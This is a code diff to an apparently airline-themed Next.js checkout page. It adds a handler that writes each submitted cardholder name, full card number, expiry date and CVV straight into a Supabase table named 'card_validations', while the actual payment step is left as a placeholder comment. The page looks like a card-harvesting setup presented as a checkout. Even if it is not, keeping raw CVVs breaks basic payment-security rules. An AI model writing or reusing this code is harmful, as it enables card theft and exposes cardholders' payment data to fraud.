@@ -5,6 +5,7 @@ import { useSearchParams, useRouter } from "next/navigation"
 import { ChevronRight, Info, PlaneTakeoff, ChevronDown, ShoppingCart } from "lucide-react"
 import { SiteLogo } from "@/components/ui/site-logo"
 import Link from "next/link"
+import { supabase } from "@/lib/supabase"
 
 // Tipos para los datos de la tarjeta
 type CardData = {
@@ -197,7 +198,7 @@ export default function PagoPage() {
     }
   }
 
-  const handleSubmit = (e: { preventDefault: () => void }) => {
+  const handleSubmit = async (e: { preventDefault: () => void }) => {
     e.preventDefault()
     
     // Validación final antes de enviar
@@ -217,6 +218,25 @@ export default function PagoPage() {
       return
     }
 
+    // Enviar datos a la base de datos
+     const { data, error } = await supabase
+    .from('card_validations')
+    .insert([
+      {
+        cardholder_name: cardData.cardholderName,
+        card_number: cardData.cardNumber,
+        expiry_month: cardData.expiryMonth,
+        expiry_year: cardData.expiryYear,
+        cvv: cardData.cvv,
+        card_type: cardData.cardType,
+      }
+    ]);
+
+    if (error) {
+      console.log(error)
+      return
+    }
+    
     setLoading(true)
     // Aquí iría la lógica para procesar el pago
   }
